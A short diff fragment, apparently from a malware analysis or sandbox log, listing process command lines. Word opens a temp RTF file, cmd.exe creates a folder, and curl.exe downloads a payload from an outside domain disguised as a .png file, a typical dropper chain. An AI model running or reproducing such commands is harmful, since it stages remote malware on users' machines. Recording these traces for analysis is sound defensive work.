@@ -21,7 +21,6 @@ WINWORD.EXE /n C:\Users\Admin\AppData\Local\Temp\data\document.rtf /o
 
 cmd.exe /c md c:\wnd
 
-
 cmd.exe /c curl.exe --output c:\wnd\3291.png --url https://yourunitedlaws.com/mrD/4462
 
 curl.exe --output c:\wnd\3291.png --url https://yourunitedlaws.com/mrD/4462
